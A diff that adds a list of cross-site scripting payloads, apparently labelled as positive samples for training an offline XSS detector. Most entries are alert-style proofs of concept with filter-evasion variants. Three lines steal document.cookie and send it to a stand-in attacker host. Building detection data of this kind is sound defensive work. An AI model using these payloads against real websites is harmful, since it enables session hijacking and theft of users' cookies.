@@ -1,0 +1,56 @@
+# XSS 基础语料（用于离线训练正样本补充）
+<script>alert(1)</script>
+<script>alert(document.domain)</script>
+<script>confirm(1)</script>
+<img src=x onerror=alert(1)>
+<img src=1 onerror=confirm(1)>
+<svg onload=alert(1)>
+<svg/onload=alert(1)>
+<body onload=alert(1)>
+<iframe src=javascript:alert(1)></iframe>
+<a href=javascript:alert(1)>click</a>
+<a href="javascript:confirm(1)">x</a>
+<input onfocus=alert(1) autofocus>
+<video><source onerror="javascript:alert(1)"></video>
+<details open ontoggle=alert(1)>
+<marquee onstart=alert(1)>
+<math href="javascript:alert(1)">
+"><script>alert(1)</script>
+'><script>alert(1)</script>
+</textarea><script>alert(1)</script>
+</title><script>alert(1)</script>
+</style><script>alert(1)</script>
+<scr<script>ipt>alert(1)</scr</script>ipt>
+<script/src=data:,alert(1)>
+<script>eval(atob('YWxlcnQoMSk='))</script>
+<script>setTimeout('alert(1)',0)</script>
+<script>location='javascript:alert(1)'</script>
+javascript:alert(1)
+javascript:confirm(1)
+data:text/html,<script>alert(1)</script>
+<img src=x onerror=prompt(1)>
+<img src=x onerror=alert(String.fromCharCode(49))>
+<img src=x onerror=top['al'+'ert'](1)>
+<svg><script>alert(1)</script></svg>
+<svg><animate onbegin=alert(1) attributeName=x dur=1s>
+<xss onmouseover=alert(1)>x</xss>
+&#x3c;script&#x3e;alert(1)&#x3c;/script&#x3e;
+&lt;script&gt;alert(1)&lt;/script&gt;
+%3cscript%3ealert(1)%3c/script%3e
+%253cscript%253ealert(1)%253c/script%253e
+<img src=x onerror=alert`1`>
+<img src=x oNerror=alert(1)>
+<div style="background-image:url(javascript:alert(1))">
+<object data="javascript:alert(1)"></object>
+<embed src="javascript:alert(1)">
+<form><button formaction="javascript:alert(1)">go</button></form>
+<meta http-equiv=refresh content="0;url=javascript:alert(1)">
+<link rel=stylesheet href="javascript:alert(1)">
+<script>fetch('https://attacker.example/'+document.cookie)</script>
+<script>new Image().src='//attacker/?c='+document.cookie</script>
+<img src=x onerror=location='//attacker/?c='+document.cookie>
+<script>document.write('<img src=x onerror=alert(1)>')</script>
+<script>Function('alert(1)')()</script>
+<script>window['alert'](1)</script>
+<script>this['alert'](1)</script>
+<script>alert?.(1)</script>
